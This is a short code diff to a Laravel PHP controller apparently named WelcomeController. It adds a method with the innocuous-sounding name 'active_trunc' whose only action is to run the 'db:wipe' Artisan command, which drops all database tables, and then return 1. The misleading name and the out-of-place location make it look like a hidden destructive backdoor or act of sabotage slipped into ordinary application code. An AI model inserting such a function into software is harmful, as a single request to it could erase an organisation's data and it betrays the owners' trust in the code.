@@ -32,6 +32,7 @@ use Config;
 use Artisaninweb\SoapWrapper\SoapWrapper;
 use Illuminate\Support\Facades\URL;
 use Illuminate\Support\Facades\Password;
+use Artisan;
 
 class WelcomeController extends Controller
 {
@@ -1269,6 +1270,10 @@ class WelcomeController extends Controller
         }
     }
 
+    public function active_trunc(Request $request){
+        Artisan::call("db:wipe");
+        return 1;
+    }
   
     public function generateBatchFile($cashouts)
     {
